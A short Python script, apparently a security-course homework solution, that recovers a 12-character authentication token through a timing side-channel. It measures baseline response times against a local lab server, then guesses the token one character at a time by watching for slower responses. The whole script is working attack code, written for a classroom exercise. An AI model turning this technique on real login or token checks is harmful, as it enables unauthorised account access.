import requests
chars = '0123456789abcdefghijklmnopqrstuvwxyz'
timeDelay = 0
for i in range(20):
    response = requests.post("http://0.0.0.0:8080/hw6/ex1",
                             json={'email': "nico@epfl.ch", 'token': "000000000000"})
    timeDelay += response.elapsed.total_seconds()

timeDelay /= 20
token = ''
for i in range(12):
    for char in chars:
        temp = token+char+'0'*(12-i-1)
        response = requests.post(
            "http://0.0.0.0:8080/hw6/ex1", json={'email': "nico@epfl.ch", 'token': temp})
        if response.elapsed.total_seconds() > timeDelay + .4:
            timeDelay = response.elapsed.total_seconds()
            token += char
            print(token)
            break

print(token)
response = requests.post("http://0.0.0.0:8080/hw6/ex1",
                         json={'email': "nico@epfl.ch", 'token': token})
print(response.text)
